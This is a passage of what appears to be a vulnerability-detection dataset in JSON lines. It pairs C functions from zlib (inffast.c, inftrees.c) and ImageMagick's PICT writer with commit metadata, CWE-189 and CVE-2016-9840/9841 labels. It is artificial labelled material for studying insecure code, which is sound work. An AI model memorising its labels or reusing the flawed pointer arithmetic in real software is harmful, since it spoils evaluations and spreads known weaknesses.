literals and length/distances until end-of-block or not enough\n        input data or output space */\n     do {\n         if (bits < 15) {\n            hold += (unsigned long)(*in++) << bits;\n             bits += 8;\n            hold += (unsigned long)(*in++) << bits;\n             bits += 8;\n         }\n         here = lcode[hold & lmask];\n      dolen:\n        op = (unsigned)(here.bits);\n        hold >>= op;\n        bits -= op;\n        op = (unsigned)(here.op);\n        if (op == 0) {                          /* literal */\n             Tracevv((stderr, here.val >= 0x20 && here.val < 0x7f ?\n                     \"inflate:         literal '%c'\\n\" :\n                     \"inflate:         literal 0x%02x\\n\", here.val));\n            *out++ = (unsigned char)(here.val);\n         }\n         else if (op & 16) {                     /* length base */\n             len = (unsigned)(here.val);\n             op &= 15;                           /* number of extra bits */\n             if (op) {\n                 if (bits < op) {\n                    hold += (unsigned long)(*in++) << bits;\n                     bits += 8;\n                 }\n                 len += (unsigned)hold & ((1U << op) - 1);\n                hold >>= op;\n                bits -= op;\n             }\n             Tracevv((stderr, \"inflate:         length %u\\n\", len));\n             if (bits < 15) {\n                hold += (unsigned long)(*in++) << bits;\n                 bits += 8;\n                hold += (unsigned long)(*in++) << bits;\n                 bits += 8;\n             }\n             here = dcode[hold & dmask];\n          dodist:\n            op = (unsigned)(here.bits);\n            hold >>= op;\n            bits -= op;\n            op = (unsigned)(here.op);\n            if (op & 16) {                      /* distance base */\n                 dist = (unsigned)(here.val);\n                 op &= 15;                       /* number of extra bits */\n                 if (bits < op) {\n                    hold += (unsigned long)(*in++) << bits;\n                     bits += 8;\n                     if (bits < op) {\n                        hold += (unsigned long)(*in++) << bits;\n                         bits += 8;\n                     }\n                 }\n                dist += (unsigned)hold & ((1U << op) - 1);\n#ifdef INFLATE_STRICT\n                if (dist > dmax) {\n                    strm->msg = (char *)\"invalid distance too far back\";\n                    state->mode = BAD;\n                    break;\n                }\n#endif\n                hold >>= op;\n                bits -= op;\n                Tracevv((stderr, \"inflate:         distance %u\\n\", dist));\n                op = (unsigned)(out - beg);     /* max distance in output */\n                if (dist > op) {                /* see if copy from window */\n                    op = dist - op;             /* distance back in window */\n                    if (op > whave) {\n                        if (state->sane) {\n                            strm->msg =\n                                (char *)\"invalid distance too far back\";\n                            state->mode = BAD;\n                            break;\n                        }\n #ifdef INFLATE_ALLOW_INVALID_DISTANCE_TOOFAR_ARRR\n                         if (len <= op - whave) {\n                             do {\n                                *out++ = 0;\n                             } while (--len);\n                             continue;\n                         }\n                         len -= op - whave;\n                         do {\n                            *out++ = 0;\n                         } while (--op > whave);\n                         if (op == 0) {\n                             from = out - dist;\n                             do {\n                                *out++ = *from++;\n                             } while (--len);\n                             continue;\n                         }\n #endif\n                     }\n                    from = window;\n                     if (wnext == 0) {           /* very common case */\n                         from += wsize - op;\n                         if (op < len) {         /* some from window */\n                             len -= op;\n                             do {\n                                *out++ = *from++;\n                             } while (--op);\n                             from = out - dist;  /* rest from output */\n                         }\n                    }\n                    else if (wnext < op) {      /* wrap around window */\n                        from += wsize + wnext - op;\n                        op -= wnext;\n                         if (op < len) {         /* some from end of window */\n                             len -= op;\n                             do {\n                                *out++ = *from++;\n                             } while (--op);\n                            from = window;\n                             if (wnext < len) {  /* some from start of window */\n                                 op = wnext;\n                                 len -= op;\n                                 do {\n                                    *out++ = *from++;\n                                 } while (--op);\n                                 from = out - dist;      /* rest from output */\n                             }\n                        }\n                    }\n                    else {                      /* contiguous in window */\n                        from += wnext - op;\n                         if (op < len) {         /* some from window */\n                             len -= op;\n                             do {\n                                *out++ = *from++;\n                             } while (--op);\n                             from = out - dist;  /* rest from output */\n                         }\n                     }\n                     while (len > 2) {\n                        *out++ = *from++;\n                        *out++ = *from++;\n                        *out++ = *from++;\n                         len -= 3;\n                     }\n                     if (len) {\n                        *out++ = *from++;\n                         if (len > 1)\n                            *out++ = *from++;\n                     }\n                 }\n                 else {\n                     from = out - dist;          /* copy direct from output */\n                     do {                        /* minimum length is three */\n                        *out++ = *from++;\n                        *out++ = *from++;\n                        *out++ = *from++;\n                         len -= 3;\n                     } while (len > 2);\n                     if (len) {\n                        *out++ = *from++;\n                         if (len > 1)\n                            *out++ = *from++;\n                     }\n                 }\n             }\n            else if ((op & 64) == 0) {          /* 2nd level distance code */\n                here = dcode[here.val + (hold & ((1U << op) - 1))];\n                goto dodist;\n            }\n            else {\n                strm->msg = (char *)\"invalid distance code\";\n                state->mode = BAD;\n                break;\n            }\n        }\n        else if ((op & 64) == 0) {              /* 2nd level length code */\n            here = lcode[here.val + (hold & ((1U << op) - 1))];\n            goto dolen;\n        }\n        else if (op & 32) {                     /* end-of-block */\n            Tracevv((stderr, \"inflate:         end of block\\n\"));\n            state->mode = TYPE;\n            break;\n        }\n        else {\n            strm->msg = (char *)\"invalid literal/length code\";\n            state->mode = BAD;\n            break;\n        }\n    } while (in < last && out < end);\n\n    /* return unused bytes (on entry, bits < 8, so in won't go too far back) */\n    len = bits >> 3;\n    in -= len;\n    bits -= len << 3;\n     hold &= (1U << bits) - 1;\n \n     /* update state and return */\n    strm->next_in = in;\n    strm->next_out = out;\n     strm->avail_in = (unsigned)(in < last ? 5 + (last - in) : 5 - (in - last));\n     strm->avail_out = (unsigned)(out < end ?\n                                  257 + (end - out) : 257 - (out - end));\n    state->hold = hold;\n    state->bits = bits;\n    return;\n}\n", "func_hash": 21320107842417320922485817989394716906, "file_name": "inffast.c", "file_hash": 318535073282265170250653548326610267480, "cwe": ["CWE-189"], "cve": "CVE-2016-9841", "cve_desc": "inffast.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact by leveraging improper pointer arithmetic.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9841"}
{"idx": 160575, "project": "zlib", "commit_id": "6a043145ca6e9c55184013841a67b2fef87e44c0", "project_url": "https://github.com/madler/zlib", "commit_url": "https://github.com/madler/zlib/commit/6a043145ca6e9c55184013841a67b2fef87e44c0", "commit_message": "Remove offset pointer optimization in inftrees.c.\n\ninftrees.c was subtracting an offset from a pointer to an array,\nin order to provide a pointer that allowed indexing starting at\nthe offset. This is not compliant with the C standard, for which\nthe behavior of a pointer decremented before its allocated memory\nis undefined. Per the recommendation of a security audit of the\nzlib code by Trail of Bits and TrustInSoft, in support of the\nMozilla Foundation, this tiny optimization was removed, in order\nto avoid the possibility of undefined behavior.", "target": 0, "func": "int ZLIB_INTERNAL inflate_table(type, lens, codes, table, bits, work)\ncodetype type;\nunsigned short FAR *lens;\nunsigned codes;\ncode FAR * FAR *table;\nunsigned FAR *bits;\nunsigned short FAR *work;\n{\n    unsigned len;               /* a code's length in bits */\n    unsigned sym;               /* index of code symbols */\n    unsigned min, max;          /* minimum and maximum code lengths */\n    unsigned root;              /* number of index bits for root table */\n    unsigned curr;              /* number of index bits for current table */\n    unsigned drop;              /* code bits to drop for sub-table */\n    int left;                   /* number of prefix codes available */\n    unsigned used;              /* code entries in table used */\n    unsigned huff;              /* Huffman code */\n    unsigned incr;              /* for incrementing code, index */\n    unsigned fill;              /* index for replicating entries */\n    unsigned low;               /* low bits for current root entry */\n    unsigned mask;              /* mask for low root bits */\n    code here;                  /* table entry for duplication */\n     code FAR *next;             /* next available space in table */\n     const unsigned short FAR *base;     /* base value table to use */\n     const unsigned short FAR *extra;    /* extra bits table to use */\n    unsigned match;             /* use base and extra for symbol >= match */\n     unsigned short count[MAXBITS+1];    /* number of codes of each length */\n     unsigned short offs[MAXBITS+1];     /* offsets in table for each length */\n     static const unsigned short lbase[31] = { /* Length codes 257..285 base */\n        3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31,\n        35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258, 0, 0};\n    static const unsigned short lext[31] = { /* Length codes 257..285 extra */\n        16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18, 18,\n        19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 203, 198};\n    static const unsigned short dbase[32] = { /* Distance codes 0..29 base */\n        1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193,\n        257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145,\n        8193, 12289, 16385, 24577, 0, 0};\n    static const unsigned short dext[32] = { /* Distance codes 0..29 extra */\n        16, 16, 16, 16, 17, 17, 18, 18, 19, 19, 20, 20, 21, 21, 22, 22,\n        23, 23, 24, 24, 25, 25, 26, 26, 27, 27,\n        28, 28, 29, 29, 64, 64};\n\n    /*\n       Process a set of code lengths to create a canonical Huffman code.  The\n       code lengths are lens[0..codes-1].  Each length corresponds to the\n       symbols 0..codes-1.  The Huffman code is generated by first sorting the\n       symbols by length from short to long, and retaining the symbol order\n       for codes with equal lengths.  Then the code starts with all zero bits\n       for the first code of the shortest length, and the codes are integer\n       increments for the same length, and zeros are appended as the length\n       increases.  For the deflate format, these bits are stored backwards\n       from their more natural integer increment ordering, and so when the\n       decoding tables are built in the large loop below, the integer codes\n       are incremented backwards.\n\n       This routine assumes, but does not check, that all of the entries in\n       lens[] are in the range 0..MAXBITS.  The caller must assure this.\n       1..MAXBITS is interpreted as that code length.  zero means that that\n       symbol does not occur in this code.\n\n       The codes are sorted by computing a count of codes for each length,\n       creating from that a table of starting indices for each length in the\n       sorted table, and then entering the symbols in order in the sorted\n       table.  The sorted table is work[], with that space being provided by\n       the caller.\n\n       The length counts are used for other purposes as well, i.e. finding\n       the minimum and maximum length codes, determining if there are any\n       codes at all, checking for a valid set of lengths, and looking ahead\n       at length counts to determine sub-table sizes when building the\n       decoding tables.\n     */\n\n    /* accumulate lengths for codes (assumes lens[] all in 0..MAXBITS) */\n    for (len = 0; len <= MAXBITS; len++)\n        count[len] = 0;\n    for (sym = 0; sym < codes; sym++)\n        count[lens[sym]]++;\n\n    /* bound code lengths, force root to be within code lengths */\n    root = *bits;\n    for (max = MAXBITS; max >= 1; max--)\n        if (count[max] != 0) break;\n    if (root > max) root = max;\n    if (max == 0) {                     /* no symbols to code at all */\n        here.op = (unsigned char)64;    /* invalid code marker */\n        here.bits = (unsigned char)1;\n        here.val = (unsigned short)0;\n        *(*table)++ = here;             /* make a table to force an error */\n        *(*table)++ = here;\n        *bits = 1;\n        return 0;     /* no symbols, but wait for decoding to report error */\n    }\n    for (min = 1; min < max; min++)\n        if (count[min] != 0) break;\n    if (root < min) root = min;\n\n    /* check for an over-subscribed or incomplete set of lengths */\n    left = 1;\n    for (len = 1; len <= MAXBITS; len++) {\n        left <<= 1;\n        left -= count[len];\n        if (left < 0) return -1;        /* over-subscribed */\n    }\n    if (left > 0 && (type == CODES || max != 1))\n        return -1;                      /* incomplete set */\n\n    /* generate offsets into symbol table for each length for sorting */\n    offs[1] = 0;\n    for (len = 1; len < MAXBITS; len++)\n        offs[len + 1] = offs[len] + count[len];\n\n    /* sort symbols by length, by symbol order within each length */\n    for (sym = 0; sym < codes; sym++)\n        if (lens[sym] != 0) work[offs[lens[sym]]++] = (unsigned short)sym;\n\n    /*\n       Create and fill in decoding tables.  In this loop, the table being\n       filled is at next and has curr index bits.  The code being used is huff\n       with length len.  That code is converted to an index by dropping drop\n       bits off of the bottom.  For codes where len is less than drop + curr,\n       those top drop + curr - len bits are incremented through all values to\n       fill the table with replicated entries.\n\n       root is the number of index bits for the root table.  When len exceeds\n       root, sub-tables are created pointed to by the root entry with an index\n       of the low root bits of huff.  This is saved in low to check for when a\n       new sub-table should be started.  drop is zero when the root table is\n       being filled, and drop is root when sub-tables are being filled.\n\n       When a new sub-table is needed, it is necessary to look ahead in the\n       code lengths to determine what size sub-table is needed.  The length\n       counts are used for this, and so count[] is decremented as codes are\n       entered in the tables.\n\n       used keeps track of how many table entries have been allocated from the\n       provided *table space.  It is checked for LENS and DIST tables against\n       the constants ENOUGH_LENS and ENOUGH_DISTS to guard against changes in\n       the initial root table size constants.  See the comments in inftrees.h\n       for more information.\n\n       sym increments through all symbols, and the loop terminates when\n       all codes of length max, i.e. all codes, have been processed.  This\n       routine permits incomplete codes, so another loop after this one fills\n       in the rest of the decoding tables with invalid code markers.\n     */\n\n    /* set up for code type */\n     switch (type) {\n     case CODES:\n         base = extra = work;    /* dummy value--not used */\n        match = 20;\n         break;\n     case LENS:\n         base = lbase;\n         extra = lext;\n        match = 257;\n         break;\n     default:            /* DISTS */\n         base = dbase;\n         extra = dext;\n        match = 0;\n     }\n \n     /* initialize state for loop */\n    huff = 0;                   /* starting code */\n    sym = 0;                    /* starting code symbol */\n    len = min;                  /* starting code length */\n    next = *table;              /* current table to fill in */\n    curr = root;                /* current table index bits */\n    drop = 0;                   /* current bits to drop from code for index */\n    low = (unsigned)(-1);       /* trigger new sub-table when len > root */\n    used = 1U << root;          /* use root table entries */\n    mask = used - 1;            /* mask for comparing low */\n\n    /* check available table space */\n    if ((type == LENS && used > ENOUGH_LENS) ||\n        (type == DISTS && used > ENOUGH_DISTS))\n        return 1;\n\n    /* process all codes and make table entries */\n     for (;;) {\n         /* create table entry */\n         here.bits = (unsigned char)(len - drop);\n        if (work[sym] + 1 < match) {\n             here.op = (unsigned char)0;\n             here.val = work[sym];\n         }\n        else if (work[sym] >= match) {\n            here.op = (unsigned char)(extra[work[sym] - match]);\n            here.val = base[work[sym] - match];\n         }\n         else {\n             here.op = (unsigned char)(32 + 64);         /* end of block */\n            here.val = 0;\n        }\n\n        /* replicate for those indices with low len bits equal to huff */\n        incr = 1U << (len - drop);\n        fill = 1U << curr;\n        min = fill;                 /* save offset to next table */\n        do {\n            fill -= incr;\n            next[(huff >> drop) + fill] = here;\n        } while (fill != 0);\n\n        /* backwards increment the len-bit code huff */\n        incr = 1U << (len - 1);\n        while (huff & incr)\n            incr >>= 1;\n        if (incr != 0) {\n            huff &= incr - 1;\n            huff += incr;\n        }\n        else\n            huff = 0;\n\n        /* go to next symbol, update count, len */\n        sym++;\n        if (--(count[len]) == 0) {\n            if (len == max) break;\n            len = lens[work[sym]];\n        }\n\n        /* create new sub-table if needed */\n        if (len > root && (huff & mask) != low) {\n            /* if first time, transition to sub-tables */\n            if (drop == 0)\n                drop = root;\n\n            /* increment past last table */\n            next += min;            /* here min is 1 << curr */\n\n            /* determine length of next table */\n            curr = len - drop;\n            left = (int)(1 << curr);\n            while (curr + drop < max) {\n                left -= count[curr + drop];\n                if (left <= 0) break;\n                curr++;\n                left <<= 1;\n            }\n\n            /* check for enough space */\n            used += 1U << curr;\n            if ((type == LENS && used > ENOUGH_LENS) ||\n                (type == DISTS && used > ENOUGH_DISTS))\n                return 1;\n\n            /* point entry in root table to sub-table */\n            low = huff & mask;\n            (*table)[low].op = (unsigned char)curr;\n            (*table)[low].bits = (unsigned char)root;\n            (*table)[low].val = (unsigned short)(next - *table);\n        }\n    }\n\n    /* fill in remaining table entry if code is incomplete (guaranteed to have\n       at most one remaining entry, since if the code is incomplete, the\n       maximum code length that was allowed to get this far is one bit) */\n    if (huff != 0) {\n        here.op = (unsigned char)64;            /* invalid code marker */\n        here.bits = (unsigned char)(len - drop);\n        here.val = (unsigned short)0;\n        next[huff] = here;\n    }\n\n    /* set return parameters */\n    *table += used;\n    *bits = root;\n    return 0;\n}\n", "func_hash": 289193798494554865750270548373678193532, "file_name": "inftrees.c", "file_hash": 100230909780333245312657757251838817211, "cwe": ["CWE-189"], "cve": "CVE-2016-9840", "cve_desc": "inftrees.c in zlib 1.2.8 might allow context-dependent attackers to have unspecified impact by leveraging improper pointer arithmetic.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2016-9840"}
{"idx": 160706, "project": "ImageMagick", "commit_id": "0f6fc2d5bf8f500820c3dbcf0d23ee14f2d9f734", "project_url": "https://github.com/ImageMagick/ImageMagick", "commit_url": "https://github.com/ImageMagick/ImageMagick/commit/0f6fc2d5bf8f500820c3dbcf0d23ee14f2d9f734", "commit_message": "", "target": 0, "func": "static MagickBooleanType WritePICTImage(const ImageInfo *image_info,\n  Image *image,ExceptionInfo *exception)\n{\n#define MaxCount  128\n#define PictCropRegionOp  0x01\n#define PictEndOfPictureOp  0xff\n#define PictJPEGOp  0x8200\n#define PictInfoOp  0x0C00\n#define PictInfoSize  512\n#define PictPixmapOp  0x9A\n#define PictPICTOp  0x98\n#define PictVersion  0x11\n\n  const StringInfo\n    *profile;\n\n  double\n    x_resolution,\n    y_resolution;\n\n  MagickBooleanType\n    status;\n\n  MagickOffsetType\n    offset;\n\n  PICTPixmap\n    pixmap;\n\n  PICTRectangle\n    bounds,\n    crop_rectangle,\n    destination_rectangle,\n    frame_rectangle,\n    size_rectangle,\n    source_rectangle;\n\n  register const Quantum\n    *p;\n\n  register ssize_t\n    i,\n    x;\n\n   size_t\n     bytes_per_line,\n     count,\n    row_bytes,\n     storage_class;\n \n   ssize_t\n    y;\n\n  unsigned char\n    *buffer,\n    *packed_scanline,\n    *scanline;\n \n   unsigned short\n     base_address,\n     transfer_mode;\n \n   /*\n    Open output image file.\n  */\n  assert(image_info != (const ImageInfo *) NULL);\n  assert(image_info->signature == MagickSignature);\n  assert(image != (Image *) NULL);\n  assert(image->signature == MagickSignature);\n  if (image->debug != MagickFalse)\n    (void) LogMagickEvent(TraceEvent,GetMagickModule(),\"%s\",image->filename);\n  if ((image->columns > 65535L) || (image->rows > 65535L))\n    ThrowWriterException(ImageError,\"WidthOrHeightExceedsLimit\");\n  assert(exception != (ExceptionInfo *) NULL);\n  assert(exception->signature == MagickSignature);\n  status=OpenBlob(image_info,image,WriteBinaryBlobMode,exception);\n  if (status == MagickFalse)\n    return(status);\n  (void) TransformImageColorspace(image,sRGBColorspace,exception);\n  /*\n    Initialize image info.\n  */\n  size_rectangle.top=0;\n  size_rectangle.left=0;\n  size_rectangle.bottom=(short) image->rows;\n  size_rectangle.right=(short) image->columns;\n  frame_rectangle=size_rectangle;\n  crop_rectangle=size_rectangle;\n   source_rectangle=size_rectangle;\n   destination_rectangle=size_rectangle;\n   base_address=0xff;\n  row_bytes=image->columns;\n   bounds.top=0;\n   bounds.left=0;\n   bounds.bottom=(short) image->rows;\n  bounds.right=(short) image->columns;\n  pixmap.version=0;\n  pixmap.pack_type=0;\n  pixmap.pack_size=0;\n  pixmap.pixel_type=0;\n  pixmap.bits_per_pixel=8;\n  pixmap.component_count=1;\n  pixmap.component_size=8;\n  pixmap.plane_bytes=0;\n  pixmap.table=0;\n  pixmap.reserved=0;\n  transfer_mode=0;\n  x_resolution=image->resolution.x != 0.0 ? image->resolution.x :\n    DefaultResolution;\n  y_resolution=image->resolution.y != 0.0 ? image->resolution.y :\n    DefaultResolution;\n  storage_class=image->storage_class;\n  if (image_info->compression == JPEGCompression)\n    storage_class=DirectClass;\n  if (storage_class == DirectClass)\n    {\n      pixmap.component_count=image->alpha_trait != UndefinedPixelTrait ? 4 : 3;\n      pixmap.pixel_type=16;\n       pixmap.bits_per_pixel=32;\n       pixmap.pack_type=0x04;\n       transfer_mode=0x40;\n      row_bytes=4*image->columns;\n     }\n   /*\n     Allocate memory.\n  */\n  bytes_per_line=image->columns;\n  if (storage_class == DirectClass)\n    bytes_per_line*=image->alpha_trait != UndefinedPixelTrait ? 4 : 3;\n  buffer=(unsigned char *) AcquireQuantumMemory(PictInfoSize,sizeof(*buffer));\n  packed_scanline=(unsigned char *) AcquireQuantumMemory((size_t)\n   (row_bytes+MaxCount),sizeof(*packed_scanline));\n  scanline=(unsigned char *) AcquireQuantumMemory(row_bytes,sizeof(*scanline));\n  if ((buffer == (unsigned char *) NULL) ||\n      (packed_scanline == (unsigned char *) NULL) ||\n      (scanline == (unsigned char *) NULL))\n    ThrowWriterException(ResourceLimitError,\"MemoryAllocationFailed\");\n  (void) ResetMagickMemory(scanline,0,row_bytes);\n  (void) ResetMagickMemory(packed_scanline,0,(size_t) (row_bytes+MaxCount));\n  /*\n    Write header, header size, size bounding box, version, and reserved.\n  */\n  (void) ResetMagickMemory(buffer,0,PictInfoSize);\n  (void) WriteBlob(image,PictInfoSize,buffer);\n  (void) WriteBlobMSBShort(image,0);\n  (void) WriteBlobMSBShort(image,(unsigned short) size_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) size_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) size_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) size_rectangle.right);\n  (void) WriteBlobMSBShort(image,PictVersion);\n  (void) WriteBlobMSBShort(image,0x02ff);  /* version #2 */\n  (void) WriteBlobMSBShort(image,PictInfoOp);\n  (void) WriteBlobMSBLong(image,0xFFFE0000UL);\n  /*\n    Write full size of the file, resolution, frame bounding box, and reserved.\n  */\n  (void) WriteBlobMSBShort(image,(unsigned short) x_resolution);\n  (void) WriteBlobMSBShort(image,0x0000);\n  (void) WriteBlobMSBShort(image,(unsigned short) y_resolution);\n  (void) WriteBlobMSBShort(image,0x0000);\n  (void) WriteBlobMSBShort(image,(unsigned short) frame_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) frame_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) frame_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) frame_rectangle.right);\n  (void) WriteBlobMSBLong(image,0x00000000L);\n  profile=GetImageProfile(image,\"iptc\");\n  if (profile != (StringInfo *) NULL)\n    {\n      (void) WriteBlobMSBShort(image,0xa1);\n      (void) WriteBlobMSBShort(image,0x1f2);\n      (void) WriteBlobMSBShort(image,(unsigned short)\n        (GetStringInfoLength(profile)+4));\n      (void) WriteBlobString(image,\"8BIM\");\n      (void) WriteBlob(image,GetStringInfoLength(profile),\n        GetStringInfoDatum(profile));\n    }\n  profile=GetImageProfile(image,\"icc\");\n  if (profile != (StringInfo *) NULL)\n    {\n      (void) WriteBlobMSBShort(image,0xa1);\n      (void) WriteBlobMSBShort(image,0xe0);\n      (void) WriteBlobMSBShort(image,(unsigned short)\n        (GetStringInfoLength(profile)+4));\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlob(image,GetStringInfoLength(profile),\n        GetStringInfoDatum(profile));\n      (void) WriteBlobMSBShort(image,0xa1);\n      (void) WriteBlobMSBShort(image,0xe0);\n      (void) WriteBlobMSBShort(image,4);\n      (void) WriteBlobMSBLong(image,0x00000002UL);\n    }\n  /*\n    Write crop region opcode and crop bounding box.\n  */\n  (void) WriteBlobMSBShort(image,PictCropRegionOp);\n  (void) WriteBlobMSBShort(image,0xa);\n  (void) WriteBlobMSBShort(image,(unsigned short) crop_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) crop_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) crop_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) crop_rectangle.right);\n  if (image_info->compression == JPEGCompression)\n    {\n      Image\n        *jpeg_image;\n\n      ImageInfo\n        *jpeg_info;\n\n      size_t\n        length;\n\n      unsigned char\n        *blob;\n\n      jpeg_image=CloneImage(image,0,0,MagickTrue,exception);\n      if (jpeg_image == (Image *) NULL)\n        {\n          (void) CloseBlob(image);\n          return(MagickFalse);\n        }\n      jpeg_info=CloneImageInfo(image_info);\n      (void) CopyMagickString(jpeg_info->magick,\"JPEG\",MagickPathExtent);\n      length=0;\n      blob=(unsigned char *) ImageToBlob(jpeg_info,jpeg_image,&length,\n        exception);\n      jpeg_info=DestroyImageInfo(jpeg_info);\n      if (blob == (unsigned char *) NULL)\n        return(MagickFalse);\n      jpeg_image=DestroyImage(jpeg_image);\n      (void) WriteBlobMSBShort(image,PictJPEGOp);\n      (void) WriteBlobMSBLong(image,(unsigned int) length+154);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBLong(image,0x00010000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00010000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x40000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00400000UL);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBShort(image,(unsigned short) image->rows);\n      (void) WriteBlobMSBShort(image,(unsigned short) image->columns);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBShort(image,768);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00566A70UL);\n      (void) WriteBlobMSBLong(image,0x65670000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000001UL);\n      (void) WriteBlobMSBLong(image,0x00016170UL);\n      (void) WriteBlobMSBLong(image,0x706C0000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBShort(image,768);\n      (void) WriteBlobMSBShort(image,(unsigned short) image->columns);\n      (void) WriteBlobMSBShort(image,(unsigned short) image->rows);\n      (void) WriteBlobMSBShort(image,(unsigned short) x_resolution);\n      (void) WriteBlobMSBShort(image,0x0000);\n      (void) WriteBlobMSBShort(image,(unsigned short) y_resolution);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x87AC0001UL);\n      (void) WriteBlobMSBLong(image,0x0B466F74UL);\n      (void) WriteBlobMSBLong(image,0x6F202D20UL);\n      (void) WriteBlobMSBLong(image,0x4A504547UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x00000000UL);\n      (void) WriteBlobMSBLong(image,0x0018FFFFUL);\n      (void) WriteBlob(image,length,blob);\n      if ((length & 0x01) != 0)\n        (void) WriteBlobByte(image,'\\0');\n      blob=(unsigned char *) RelinquishMagickMemory(blob);\n    }\n  /*\n    Write picture opcode, row bytes, and picture bounding box, and version.\n  */\n  if (storage_class == PseudoClass)\n    (void) WriteBlobMSBShort(image,PictPICTOp);\n  else\n    {\n      (void) WriteBlobMSBShort(image,PictPixmapOp);\n      (void) WriteBlobMSBLong(image,(size_t) base_address);\n    }\n  (void) WriteBlobMSBShort(image,(unsigned short) (row_bytes | 0x8000));\n  (void) WriteBlobMSBShort(image,(unsigned short) bounds.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) bounds.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) bounds.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) bounds.right);\n  /*\n    Write pack type, pack size, resolution, pixel type, and pixel size.\n  */\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.version);\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.pack_type);\n  (void) WriteBlobMSBLong(image,(unsigned int) pixmap.pack_size);\n  (void) WriteBlobMSBShort(image,(unsigned short) (x_resolution+0.5));\n  (void) WriteBlobMSBShort(image,0x0000);\n  (void) WriteBlobMSBShort(image,(unsigned short) (y_resolution+0.5));\n  (void) WriteBlobMSBShort(image,0x0000);\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.pixel_type);\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.bits_per_pixel);\n  /*\n    Write component count, size, plane bytes, table size, and reserved.\n  */\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.component_count);\n  (void) WriteBlobMSBShort(image,(unsigned short) pixmap.component_size);\n  (void) WriteBlobMSBLong(image,(unsigned int) pixmap.plane_bytes);\n  (void) WriteBlobMSBLong(image,(unsigned int) pixmap.table);\n  (void) WriteBlobMSBLong(image,(unsigned int) pixmap.reserved);\n  if (storage_class == PseudoClass)\n    {\n      /*\n        Write image colormap.\n      */\n      (void) WriteBlobMSBLong(image,0x00000000L);  /* color seed */\n      (void) WriteBlobMSBShort(image,0L);  /* color flags */\n      (void) WriteBlobMSBShort(image,(unsigned short) (image->colors-1));\n      for (i=0; i < (ssize_t) image->colors; i++)\n      {\n        (void) WriteBlobMSBShort(image,(unsigned short) i);\n        (void) WriteBlobMSBShort(image,ScaleQuantumToShort(\n          image->colormap[i].red));\n        (void) WriteBlobMSBShort(image,ScaleQuantumToShort(\n          image->colormap[i].green));\n        (void) WriteBlobMSBShort(image,ScaleQuantumToShort(\n          image->colormap[i].blue));\n      }\n    }\n  /*\n    Write source and destination rectangle.\n  */\n  (void) WriteBlobMSBShort(image,(unsigned short) source_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) source_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) source_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) source_rectangle.right);\n  (void) WriteBlobMSBShort(image,(unsigned short) destination_rectangle.top);\n  (void) WriteBlobMSBShort(image,(unsigned short) destination_rectangle.left);\n  (void) WriteBlobMSBShort(image,(unsigned short) destination_rectangle.bottom);\n  (void) WriteBlobMSBShort(image,(unsigned short) destination_rectangle.right);\n  (void) WriteBlobMSBShort(image,(unsigned short) transfer_mode);\n  /*\n    Write picture data.\n  */\n  count=0;\n  if (storage_class == PseudoClass)\n    for (y=0; y < (ssize_t) image->rows; y++)\n    {\n      p=GetVirtualPixels(image,0,y,image->columns,1,exception);\n      if (p == (const Quantum *) NULL)\n        break;\n      for (x=0; x < (ssize_t) image->columns; x++)\n      {\n        scanline[x]=(unsigned char) 